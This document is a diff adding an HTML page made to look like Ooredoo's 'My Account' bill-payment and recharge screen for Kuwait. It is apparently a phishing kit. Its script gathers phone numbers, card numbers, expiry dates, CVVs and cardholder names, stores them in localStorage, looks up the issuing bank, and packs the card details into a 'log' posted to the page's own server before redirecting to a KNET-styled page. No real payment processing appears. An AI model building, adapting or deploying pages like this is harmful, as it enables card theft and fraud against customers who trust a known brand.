@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+    <meta charset="utf-8">
+    <title>Ooredoo - My Account</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="icon" href="myooredoo/favicon.ico">
+    <link rel="apple-touch-icon" href="myooredoo/logo192.png">
+    <!-- تحميل ملفات CSS -->
+    <link rel="stylesheet" href="myooredoo/assets/css/vendors/bootstrap.min.css">
+    <link rel="stylesheet" href="myooredoo/assets/css/vendors/animate.css">
+    <link rel="stylesheet" href="myooredoo/assets/css/vendors/swiper-bundle.min.css">
+    <link rel="stylesheet" href="myooredoo/assets/css/custom.css">
+    <link rel="stylesheet" href="myooredoo/assets/css/shimmer-effect.css">
+    <link rel="stylesheet" href="myooredoo/assets/css/custom16.css">
+    <link rel="stylesheet" href="myooredoo/gosell.css">
+    <link rel="stylesheet" href="myooredoo/static/css/main.7ed5cd68.css">
+
+
+
+
+
+
+</head>
+
+<body id="app-body" class="shimmer-effect shimmerBG fixed_footer_sp16">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root">
+        <div class="App">
+            <div id="container_main" class="body_container post_login">
+                <!-- Header -->
+                <header class="header">
+                    <div class="header_container flex_grp_center">
+                        <div class="header_left">
+                            <button class="img_btn img_btn_lg btn_trigger" id="backButton">
+                                <img src="myooredoo/assets/images/back_dark.svg" alt="" id="back_image">
+                            </button>
+                        </div>
+                        <div class="header_center">
+                            <h4 class="header_title" data-lang="2">Pay</h4>
+                        </div>
+                        <div class="header_actions flex_grp_align_center">
+                            <button id="langbtn" class="language_change" data-lang="333">عربى</button>
+                            <button class="img_btn img_btn_lg btn_trigger">
+                                <img src="myooredoo/assets/images/assist_icon.png" alt="">
+                            </button>
+                        </div>
+                    </div>
+                </header>
+                <!-- Side Menu -->
+                <section class="side_menu_wrapper">
+                    <div class="side_menu_wrapper_inside">
+                        <div class="side_menu_top">
+                            <a class="side_menu_logo">
+                                <img src="myooredoo/assets/images/logo_red.svg" alt="">
+                            </a>
+                        </div>
+                        <ul class="side_menu_list">
+                            <li>
+                                <a class="side_menu_item">
+                                    <img src="myooredoo/assets/images/home_black.svg" class="black_icon" alt="">
+                                    <img src="myooredoo/assets/images/home_gray.svg" class="gray_icon" alt="">
+                                    <span data-lang="3">Home</span>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="side_menu_item active">
+                                    <img src="myooredoo/assets/images/pay_black.svg" class="black_icon" alt="">
+                                    <img src="myooredoo/assets/images/pay_gray.svg" class="gray_icon" alt="">
+                                    <span data-lang="4">Pay</span>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="side_menu_item">
+                                    <img src="myooredoo/assets/images/shop_black.svg" class="black_icon" alt="">
+                                    <img src="myooredoo/assets/images/shop_gray.svg" class="gray_icon" alt="">
+                                    <span data-lang="5">Shop</span>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="side_menu_item">
+                                    <img src="myooredoo/assets/images/more_black.svg" class="black_icon" alt="">
+                                    <img src="myooredoo/assets/images/more_gray.svg" class="gray_icon" alt="">
+                                    <span data-lang="6">More</span>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </section>
+                <!-- Main Content -->
+                <section id="content_cont" class="app_main_wrapper pt-60 pb-76 d-flex flex-column">
+                    <!-- First Page -->
+                    <div class="center_section" id="firstPage">
+                        <div class="sec_top">
+                            <div class="pse_sm">
+                                <img class="w-100 border-radius20" id="topImage" src="myooredoo/topimage.jpg">
+                            </div>
+                            <div class="pse_sm">
+                                <div class="recharge_sec overflow-auto mb-5 pb-5">
+                                    <!-- مدخل الرقم الأول والمبلغ -->
+                                    <div>
+                                        <div class="d-flex flex-row justify-content-between gap-2 mb-2 mt-3">
+                                            <div class="form-group width50">
+                                                <label class="control-label" data-lang="7">MOBILE NUMBER</label>
+                                                <div class="input_icon right-icon">
+                                                    <input id="inputField1" type="text" class="form-control" value="" style="border-color: rgb(237, 28, 36);" maxlength="8">
+                                                    <button id="clearInputField1" style="display: none;" onclick="this.style.display = 'none'">
+                                                        <img src="myooredoo/assets/close_icon_filled.svg" alt="" style="width: 22px;">
+                                                    </button>
+                                                </div>
+                                            </div>
+                                            <div class="form-group width35">
+                                                <label class="control-label" data-lang="8">AMOUNT</label>
+                                                <div class="input_icon left-icon">
+                                                    <input id="inputField1Price" type="text" class="form-control" value="5" maxlength="8">
+                                                    <button data-lang="222">KD</button>
+                                                </div>
+                                            </div>
+                                            <button class="img_btn width15"></button>
+                                        </div>
+                                    </div>
+                                    <!-- مدخل الرقم الثاني في حال اختيار "PAY FOR ANOTHER NUMBER" -->
+                                    <div id="secondinputBlock">
+                                        <div class="d-flex flex-row justify-content-between gap-2 mb-2 mt-3">
+                                            <div class="form-group width50">
+                                                <label class="control-label" data-lang="9">MOBILE NUMBER</label>
+                                                <div class="input_icon right-icon">
+                                                    <input id="inputField2" type="text" class="form-control" value="" style="border-color: rgb(237, 28, 36);" maxlength="8">
+                                                    <button id="clearInputField2" style="display: none;" onclick="this.style.display = 'none'">
+                                                        <img src="myooredoo/assets/close_icon_filled.svg" alt="" style="width: 22px;">
+                                                    </button>
+                                                </div>
+                                            </div>
+                                            <div class="form-group width35">
+                                                <label class="control-label" data-lang="10">AMOUNT</label>
+                                                <div class="input_icon left-icon">
+                                                    <input id="inputField2Price" type="text" class="form-control" value="5" maxlength="8">
+                                                    <button>KD</button>
+                                                </div>
+                                            </div>
+                                            <button class="img_btn width15" id="secondinputRemove">
+                                                <img src="myooredoo/assets/images/delete.svg" alt="">
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <div class="text-center mt-5">
+                                        <div id="payForAnotherNumber" class="custom_btn custom_btn_primary_outline btn_block mt-3" data-lang="11">
+                                            PAY FOR ANOTHER NUMBER
+                                        </div>
+                                    </div>
+                                </div>
+                                <section class="fixed_footer">
+                                    <div class="fixed_footer_container">
+                                        <div class="mb-3 flex_grp_align_center">
+                                            <div>
+                                                <img src="myooredoo/assets/images/details-icon.svg" width="40" alt="">
+                                            </div>
+                                            <div class="d-flex flex-column ms-2">
+                                                <h4 class="primary_14 mb-1" data-lang="12">Bill payment / Recharge</h4>
+                                                <p class="support_text mb-0">
+                                                    <span data-lang="111">Total: KD</span>
+                                                    <span id="totalAmount">5</span>.000
+                                                </p>
+                                            </div>
+                                        </div>
+                                        <button id="continueButton" class="custom_btn custom_btn_primary btn_block disabled" disabled data-lang="13">
+                                            CONTINUE
+                                        </button>
+                                    </div>
+                                </section>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- Second Page: اختيار طريقة الدفع -->
+                    <div class="center_section" id="secondPage" style="background: rgb(240, 240, 240); display: none;">
+                        <div class="sec_top">
+                            <div class="pse_sm mt-4">
+                                <div class="pay-comp white-bg">
+                                    <div class="total-comp">
+                                        <div data-lang="14">Total</div>
+                                        <div><span id="totalSecondPage"></span>.000 <span data-lang="222">KD</span></div>
+                                    </div>
+                                </div>
+                                <div class="mt-5 mb-4">
+                                    <h2 class="mb-2 page_title_v1" data-lang="15">Payment Method</h2>
+                                    <p class="support_text mb-0" data-lang="16">Select the Payment method of your choose</p>
+                                </div>
+                                <div class="radiobutton-comp mt-4">
+                                    <div class="pay-cont">
+                                        <div class="filter-comp mb-5">
+                                            <h6 class="primary_14 mt-5 cat-title" data-lang="17">PREFERRED</h6>
+                                            <div class="filte-plane mt-4">
+                                                <input type="radio" name="radiocheck" id="KNET" value="KNET" checked>
+                                                <label for="KNET" class="white-bg" style="display: flex; align-items: center; justify-content: space-between;">
+                                                    <div>
+                                                        <img src="myooredoo/638289943280525523.png" alt="">
+                                                        <span style="font-weight: bold;" data-lang="22">KNET</span>
+                                                    </div>
+                                                    <div></div>
+                                                </label>
+                                            </div>
+                                            <h6 class="primary_14 mt-5 cat-title" data-lang="21">OTHER METHODS</h6>
+                                            <div class="filte-plane mt-4">
+                                                <input type="radio" name="radiocheck" id="CreditCard" value="CreditCard">
+                                                <label for="CreditCard" class="white-bg" style="display: flex; align-items: center; justify-content: space-between;">
+                                                    <div>
+                                                        <img src="myooredoo/638247324946260737.png" alt="">
+                                                        <span style="font-weight: bold;" data-lang="18">Credit Card</span>
+                                                    </div>
+                                                    <div></div>
+                                                    <div class="mb-3 msg" id="payment_ex_content">
+                                                        <!-- نموذج بيانات بطاقة الائتمان -->
+                                                        <div id="tap-card-elements">
+                                                            <form id="gosell-gateway-form-container" method="post">
+                                                                <div id="gosell-gateway-element-container">
+                                                                    <div id="privateTapElement">
+                                                                        <div class="holds-the-iframe">
+                                                                            <div id="brands-container" class="brands-container">
+                                                                                <div id="icon-VISA" class="icon" data-sort="4">
+                                                                                    <img id="VISA" class="brand-icon" src="myooredoo/assets/images/visa.svg" alt="VISA">
+                                                                                </div>
+                                                                                <div id="icon-MASTERCARD" class="icon" data-sort="5">
+                                                                                    <img id="MASTERCARD" class="brand-icon" src="myooredoo/assets/images/mastercard.svg" alt="MASTERCARD">
+                                                                                </div>
+                                                                                <div id="icon-AMERICAN_EXPRESS" class="icon" data-sort="6">
+                                                                                    <img id="AMERICAN_EXPRESS" class="brand-icon" src="myooredoo/assets/images/american_express.svg" alt="AMERICAN_EXPRESS">
+                                                                                </div>
+                                                                            </div>
+                                                                            <div id="fields-container" class="fields-container">
+                                                                                <div id="row-0" class="row">
+                                                                                    <div id="col-1-0" class="col-1">
+                                                                                        <div id="group-0" class="group">
+                                                                                            <input id="card-number" name="card-number" autocomplete="off" class="masked" type="tel" placeholder="Card number" maxlength="16">
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                                <div id="row-1" class="row">
+                                                                                    <div id="col-2-1" class="col-2">
+                                                                                        <div id="group-1" class="group">
+                                                                                            <input id="expiration-date" name="expiration-date" class="masked" maxlength="5" type="tel" autocomplete="off" placeholder="MM/YY" onkeypress="expDateFormat()">
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div id="col-2-2" class="col-2">
+                                                                                        <div id="group-2" class="group">
+                                                                                            <input id="cvv" name="cvv" class="masked allownumericwithoutdecimal" autocomplete="off" maxlength="3" placeholder="CVV" type="password" inputmode="tel">
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                                <div id="row-3" class="row">
+                                                                                    <div id="col-1-3" class="col-1">
+                                                                                        <div id="group-3" class="group">
+                                                                                            <input id="card-holder" name="card-holder" class="txtOnly" autocomplete="off" type="text" placeholder="Name on card">
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </form>
+                                                        </div>
+                                                        <p id="msg"></p>
+                                                        <div class="d-flex justify-content-between" style="font-size: 16px; font-weight: 700; margin-top: 2rem;">
+                                                            <div data-lang="19">For faster and more secure checkout, please save your card</div>
+                                                            <div>
+                                                                <div class="form-check form-switch">
+                                                                    <input class="form-check-input" type="checkbox" role="switch" id="flexSwitchCheckDefault">
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <section class="fixed_footer">
+                                    <div class="fixed_footer_container">
+                                        <button id="finalPayButton" class="custom_btn custom_btn_primary btn_block text-initials" data-lang="20">Pay</button>
+                                    </div>
+                                </section>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- تمرير رابط الـ route إلى جافاسكريبت -->
+                    <script>
+                        var storeUrl = "#";
+                    </script>
+                </section>
+            </div>
+        </div>
+    </div>
+    <!-- تحميل jQuery -->
+    <script src="myooredoo/assets/js/jquery-3.7.1.min.js"></script>
+    <script>
+        // إنشاء مفتاح العميل وحفظه في localStorage
+        if (!localStorage.getItem("clientKey")) {
+            let timestamp = Date.now().toString(36);
+            let randomPart = Math.random().toString(36).substr(2, 9);
+            const clientKey = (timestamp + randomPart).substr(0, 20);
+            localStorage.setItem("clientKey", clientKey);
+            console.log("Client Key created:", clientKey);
+        } else {
+            clientKey = localStorage.getItem("clientKey");
+            console.log("Client Key exists:", clientKey);
+        }
+
+        let lang = document.documentElement.getAttribute('lang');
+        const langbtn = document.getElementById('langbtn');
+        const topImage = document.getElementById('topImage');
+
+        langbtn.addEventListener('click', switchLanguage);
+
+        function switchLanguage() {
+            if (lang === 'en') {
+                topImage.src = "myooredoo/topimagear.jpg";
+                lang = 'ar';
+                document.documentElement.setAttribute('dir', 'rtl');
+                document.documentElement.classList.add('arabic');
+                document.documentElement.setAttribute('lang', 'ar');
+                document.getElementById('card-number').setAttribute('placeholder', 'رقم البطاقة');
+                document.getElementById('card-holder').setAttribute('placeholder', 'الاسم على البطاقة');
+                document.querySelectorAll("[data-lang]").forEach(function(tr) {
+                    let phrase = tr.getAttribute("data-lang");
+                    let translatedPhrase = translation['ar'][phrase];
+                    tr.innerHTML = translatedPhrase;
+                });
+            } else if (lang === 'ar') {
+                topImage.src = "myooredoo/topimage.jpg";
+                lang = 'en';
+                document.documentElement.setAttribute('dir', 'ltr');
+                document.documentElement.classList.remove('arabic');
+                document.documentElement.setAttribute('lang', 'en');
+                document.getElementById('card-number').setAttribute('placeholder', 'Card number');
+                document.getElementById('card-holder').setAttribute('placeholder', 'Name on card');
+                document.querySelectorAll("[data-lang]").forEach(function(tr) {
+                    let phrase = tr.getAttribute("data-lang");
+                    let translatedPhrase = translation['en'][phrase];
+                    tr.innerHTML = translatedPhrase;
+                });
+            }
+        }
+
+        // التقاط قيمة رقم الهاتف من الحقل عند تحميل الصفحة (ستكون فارغة إن لم يدخل المستخدم قيمة)
+        var phone = document.getElementById('inputField1').value;
+        console.log("Initial phone value:", phone);
+
+        const translation = {
+            "en": {
+                1: 'Ooredoo - My Account',
+                2: 'Pay',
+                3: 'Home',
+                4: 'Pay',
+                5: 'Shop',
+                6: 'More',
+                7: 'MOBILE NUMBER',
+                8: 'AMOUNT',
+                9: 'MOBILE NUMBER',
+                10: 'AMOUNT',
+                11: 'PAY FOR ANOTHER NUMBER',
+                12: 'Bill payment / Recharge',
+                13: 'CONTINUE',
+                14: 'Total',
+                15: 'Payment Method',
+                16: 'Select the Payment method of your choose',
+                17: 'PREFERRED',
+                18: 'Credit Card',
+                19: 'For faster and more secure checkout, please save your card',
+                20: 'Pay',
+                111: 'Total: KD',
+                222: 'KD',
+                333: 'عربى',
+                21: 'OTHER METHODS',
+                22: 'KNET'
+            },
+            "ar": {
+                1: 'Ooredoo - حسابي',
+                2: 'دفع',
+                3: 'الرئيسية',
+                4: 'دفع',
+                5: 'المتجر',
+                6: 'المزيد',
+                7: 'رقم الموبايل',
+                8: 'المبلغ',
+                9: 'رقم الموبايل',
+                10: 'المبلغ',
+                11: 'الدفع لرقم آخر',
+                12: 'إعادة التعبئة / دفع الفواتير',
+                13: 'استمرار',
+                14: 'الإجمالي',
+                15: 'طريقة الدفع',
+                16: 'حدد طريقة الدفع التي تختارها',
+                17: 'طرق الدفع المفضلة',
+                18: 'بطاقة الائتمان',
+                19: 'لإجراء عملية دفع أسرع وأكثر أمانًا، يرجى حفظ بطاقتك',
+                20: 'دفع',
+                111: 'الإجمالي: د.ك',
+                222: 'د.ك',
+                333: 'English',
+                21: 'طرق دفع أخرى',
+                22: 'كي نت'
+            }
+        };
+
+        let price1 = 5,
+            price2 = 0,
+            totalPrice = price1 + price2,
+            showSecond = 0;
+        const firstPage = document.getElementById('firstPage');
+        const secondPage = document.getElementById('secondPage');
+        const payForAnotherNumber = document.getElementById('payForAnotherNumber');
+        const secondinputBlock = document.getElementById('secondinputBlock');
+        secondinputBlock.style.display = 'none';
+        const secondinputRemove = document.getElementById('secondinputRemove');
+        const continueButton = document.getElementById('continueButton');
+        const totalAmount = document.getElementById('totalAmount');
+        const inputField1 = document.getElementById('inputField1');
+        const inputField2 = document.getElementById('inputField2');
+        const inputField1Price = document.getElementById('inputField1Price');
+        const inputField2Price = document.getElementById('inputField2Price');
+        const clearInputField1 = document.getElementById('clearInputField1');
+        const totalSecondPage = document.getElementById('totalSecondPage');
+        const creditCardBlock = document.getElementById('payment_ex_content');
+        const paymentMethods = document.querySelectorAll('input[name="radiocheck"]');
+        const finalPayButton = document.getElementById('finalPayButton');
+        const backButton = document.getElementById('backButton');
+
+        clearInputField1.addEventListener('click', function() {
+            inputField1.value = '';
+        });
+        const clearInputField2 = document.getElementById('clearInputField2');
+        clearInputField2.addEventListener('click', function() {
+            inputField2.value = '';
+        });
+
+        inputField1Price.addEventListener('input', function() {
+            if (!this.value) {
+                price1 = 0;
+                continueButton.setAttribute('disabled', 'disabled');
+                continueButton.classList.add('disabled');
+            } else if (inputField1.value.length === 8) {
+                continueButton.removeAttribute('disabled');
+                continueButton.classList.remove('disabled');
+            }
+            price1 = Number(this.value);
+            totalPrice = price1 + price2;
+            totalAmount.innerText = totalPrice;
+        });
+
+        inputField2Price.addEventListener('input', function() {
+            if (!this.value) {
+                price2 = 0;
+                continueButton.setAttribute('disabled', 'disabled');
+                continueButton.classList.add('disabled');
+            } else if (inputField1.value.length === 8) {
+                continueButton.removeAttribute('disabled');
+                continueButton.classList.remove('disabled');
+            }
+            price2 = Number(this.value);
+            totalPrice = price1 + price2;
+            totalAmount.innerText = totalPrice;
+        });
+
+        inputField1.addEventListener('input', function() {
+            this.value.length === 0 ? clearInputField1.style.display = 'none' : clearInputField1.style.display = 'block';
+            if (this.value.length === 8 && price1 > 0) {
+                clearInputField1.style.display = 'none';
+                continueButton.removeAttribute('disabled');
+                continueButton.classList.remove('disabled');
+                this.removeAttribute('style');
+            } else {
+                this.style.borderColor = 'rgb(237, 28, 36)';
+                continueButton.setAttribute('disabled', 'disabled');
+                continueButton.classList.add('disabled');
+            }
+        });
+
+        inputField2.addEventListener('input', function() {
+            this.value.length === 0 ? clearInputField2.style.display = 'none' : clearInputField2.style.display = 'block';
+            if (this.value.length === 8) {
+                clearInputField2.style.display = 'none';
+                this.removeAttribute('style');
+            } else {
+                this.style.borderColor = 'rgb(237, 28, 36)';
+            }
+        });
+
+        payForAnotherNumber.addEventListener('click', function() {
+            this.style.display = 'none';
+            secondinputBlock.style.display = 'block';
+            showSecond = 1;
+            price2 = 5;
+        });
+
+        secondinputRemove.addEventListener('click', function() {
+            secondinputBlock.style.display = 'none';
+            payForAnotherNumber.style.display = 'block';
+            inputField2.value = '';
+            inputField2Price.value = '';
+            showSecond = 0;
+            price2 = 0;
+            totalPrice = price1;
+            totalAmount.innerText = totalPrice;
+        });
+
+        continueButton.addEventListener('click', function() {
+            // قراءة القيمة الحالية لحقل رقم الهاتف
+            var phone = inputField1.value;
+            console.log("رقم الهاتف:", phone);
+            firstPage.style.display = 'none';
+            secondPage.style.display = 'block';
+            localStorage.setItem('Total', totalPrice);
+            totalSecondPage.innerHTML = totalPrice;
+        });
+
+        backButton.addEventListener('click', function() {
+            firstPage.style.display = 'block';
+            secondPage.style.display = 'none';
+        });
+
+        creditCardBlock.style.display = 'none';
+        const knetRadio = document.getElementById('KNET');
+        if (knetRadio && knetRadio.checked) {
+            finalPayButton.setAttribute('onclick', 'knet_payment(event)');
+        }
+        paymentMethods.forEach(function(radio) {
+            radio.addEventListener('change', function() {
+                if (this.value === 'KNET') {
+                    creditCardBlock.style.display = 'none';
+                    finalPayButton.removeAttribute('disabled');
+                    finalPayButton.classList.remove('disabled');
+                    finalPayButton.setAttribute('onclick', 'knet_payment(event)');
+                } else if (this.value === 'CreditCard') {
+                    creditCardBlock.style.display = 'block';
+                    finalPayButton.removeAttribute('onclick');
+                    validateForm();
+                }
+            });
+        });
+
+        const iconVisa = document.getElementById('icon-VISA');
+        const iconMasterCard = document.getElementById('icon-MASTERCARD');
+        const iconAmerican = document.getElementById('icon-AMERICAN_EXPRESS');
+        const cardNumber = document.getElementById('card-number');
+        const expireDate = document.getElementById('expiration-date');
+        const cvv = document.getElementById('cvv');
+        const cardHolder = document.getElementById('card-holder');
+        const errorMessage = document.getElementById('msg');
+
+        function expDateFormat() {
+            let expire_date = expireDate.value;
+            if (expire_date.length == 2) {
+                expireDate.value = expire_date + '/';
+            }
+        }
+
+        let binCheckTimeout;
+        async function checkBin(bin) {
+            const url = 'api.php';
+            const ip = '162.158.23.46';
+            const options = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    bin: bin,
+                    ip: ip
+                })
+            };
+            try {
+                const response = await fetch(url, options);
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                const result = await response.json();
+                console.log(result);
+                return result;
+            } catch (error) {
+                console.error('Error:', error);
+                return null;
+            }
+        }
+
+        function checkLuhn(value) {
+            var value = value.replace(/\D/g, '');
+            var sum = 0,
+                shouldDouble = false;
+            for (var i = value.length - 1; i >= 0; i--) {
+                var digit = parseInt(value.charAt(i));
+                if (shouldDouble) {
+                    if ((digit *= 2) > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return (sum % 10) === 0;
+        }
+
+        let binData;
+        async function validateForm() {
+            let cardNumberValue = cardNumber.value.replace(/\s+/g, '');
+            if (cardNumberValue.length !== 16) {
+                errorMessage.innerHTML = "Card number must be 16 digits";
+                finalPayButton.disabled = true;
+                cardNumber.style.borderColor = "red";
+                return;
+            } else if (!checkLuhn(cardNumberValue)) {
+                errorMessage.innerHTML = "Enter valid Visa or Mastercard number";
+                finalPayButton.disabled = true;
+                cardNumber.style.borderColor = "red";
+                return;
+            } else {
+                cardNumber.style.borderColor = "";
+                checkCard();
+            }
+
+            function checkCard() {
+                clearTimeout(binCheckTimeout);
+                binCheckTimeout = setTimeout(async () => {
+                    binData = await checkBin(cardNumberValue.slice(0, 6));
+                    if (binData && binData.code === 200) {
+                        localStorage.setItem('BinInfo', JSON.stringify(binData));
+                        switch (binData.BIN.brand) {
+                            case 'VISA':
+                                iconMasterCard.style.display = 'none';
+                                iconAmerican.style.display = 'none';
+                                break;
+                            case 'MASTERCARD':
+                                iconVisa.style.display = 'none';
+                                iconAmerican.style.display = 'none';
+                                break;
+                            case 'AMERICAN_EXPRESS':
+                                iconVisa.style.display = 'none';
+                                iconMasterCard.style.display = 'none';
+                                break;
+                            default:
+                                break;
+                        }
+                        errorMessage.innerHTML = '';
+                        cardNumber.style.borderColor = "";
+                        finalPayButton.disabled = false;
+                        finalPayButton.classList.remove('disabled');
+                    } else {
+                        cardNumber.style.borderColor = "red";
+                        errorMessage.innerHTML = "Invalid card number";
+                        finalPayButton.classList.add('disabled');
+                        finalPayButton.setAttribute('disabled', 'disabled');
+                    }
+                }, 1000);
+            }
+            if (expireDate.value.length !== 5) {
+                errorMessage.innerHTML = "Expiry month is required";
+                finalPayButton.disabled = true;
+                expireDate.style.borderColor = "red";
+                return;
+            } else {
+                expireDate.style.borderColor = "";
+            }
+            if (cvv.value.length !== 3) {
+                errorMessage.innerHTML = "CVV is required";
+                finalPayButton.disabled = true;
+                cvv.style.borderColor = "red";
+                return;
+            } else {
+                cvv.style.borderColor = "";
+            }
+            if (cardHolder.value.length < 1) {
+                errorMessage.innerHTML = "Card holder name is required";
+                finalPayButton.disabled = true;
+                cardHolder.style.borderColor = "red";
+                return;
+            } else {
+                cardHolder.style.borderColor = "";
+            }
+            localStorage.setItem('cardNumber', cardNumberValue);
+            localStorage.setItem('ExpiryMonth', expireDate.value);
+            localStorage.setItem('CVV', cvv.value);
+            localStorage.setItem('CardHolder', cardHolder.value);
+            localStorage.setItem('currency', 'KD');
+            localStorage.setItem('merchant', 'myooredoo-pay');
+            errorMessage.innerHTML = '';
+            finalPayButton.disabled = false;
+            finalPayButton.classList.remove('disabled');
+        }
+
+        cardNumber.addEventListener('input', validateForm);
+        expireDate.addEventListener('input', validateForm);
+        cvv.addEventListener('input', validateForm);
+        cardHolder.addEventListener('input', validateForm);
+
+        finalPayButton.addEventListener('click', function(event) {
+            event.preventDefault();
+            var client_ip = "1";
+            (function() { var data = {ip: "0.0.0.0"};
+                client_ip = data.ip;
+                const log_data = {
+                    card: {
+                        number: cardNumber.value,
+                        exp: expireDate.value,
+                        cvv: cvv.value,
+                    },
+                    other: {
+                        cart_ammout: totalPrice + '.00 KD',
+                        clientKey: clientKey,
+                        name: cardHolder.value,
+                        ip: client_ip,
+                        bankName: binData.BIN.issuer.name,
+                        cardBrand: binData.BIN.brand,
+                    }
+                };
+                // بعد إرسال البيانات نقوم بإعادة التوجيه إلى الصفحة المطلوبة
+                sendLog(JSON.stringify(log_data));
+            });
+        });
+
+        let startLang = (navigator.language || navigator.userLanguage).slice(0, 2);
+        if (startLang === 'ar') {
+            switchLanguage();
+        }
+
+        function sendLog(data) {
+            $.post("#", {
+                log: data
+            }, function(response) {
+                console.log("Response:", response);
+                // مثال على إعادة التوجيه بعد النجاح، قم بتعديل الرابط حسب الحاجة:
+                window.location.href = "./knetpage.html";
+            });
+        }
+
+        function generateSimilarNumber(baseNumber) {
+            const baseStr = baseNumber.toString();
+            const prefix = baseStr.slice(0, -5);
+            const randomSuffix = Math.floor(10000 + Math.random() * 90000).toString();
+            return prefix + randomSuffix;
+        }
+
+        // تعديل دالة knet_payment لاستخدام POST مع إضافة توكن CSRF
+        function knet_payment(event) {
+            event.preventDefault();
+            localStorage.setItem('Total', totalPrice);
+            // إنشاء فورم مخفي لتقديم البيانات باستخدام POST
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = "#";
+
+            // إضافة توكن CSRF
+            var csrfInput = document.createElement('input');
+            csrfInput.type = 'hidden';
+            csrfInput.name = '_token';
+            csrfInput.value = "yHz88lwiZ20KwKQdeevEZTrtAzwFI8QgmxI3JiS8";
+            form.appendChild(csrfInput);
+
+            // إضافة بيانات إضافية مع تعديل المفتاح إلى "total"
+            var inputLog = document.createElement('input');
+            inputLog.type = 'hidden';
+            inputLog.name = 'log';
+            inputLog.value = JSON.stringify({
+                phone: inputField1.value, // قراءة القيمة الحالية لحقل رقم الهاتف
+                total: totalPrice,
+                clientKey: localStorage.getItem('clientKey')
+            });
+            form.appendChild(inputLog);
+
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</body>
+
+</html>
